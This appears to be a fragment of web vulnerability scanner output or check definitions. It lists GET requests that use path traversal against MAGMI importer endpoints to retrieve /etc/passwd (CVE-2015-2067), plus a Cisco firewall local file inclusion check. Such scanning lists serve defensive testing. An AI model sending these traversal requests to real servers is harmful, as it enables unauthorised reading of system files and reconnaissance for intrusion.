++ GET /shop/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /shop/magmi-importer/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility: MAGMI allows any file to be retrieved remotely. See: CVE-2015-2067: 
++ GET /web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /magento/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /magento/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /shop/magmi/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ GET /shop/magmi-importer/web/download_file.php?file=../../../../../../../../../../../etc/passwd: MAGMI allows any file to be retrieved remotely.
++ POST /scgi-bin/platform.cgi: Devices with Cisco http firewall are prone to a local file inclusion. See: https://exploit-db.com/exploits/39184/: 
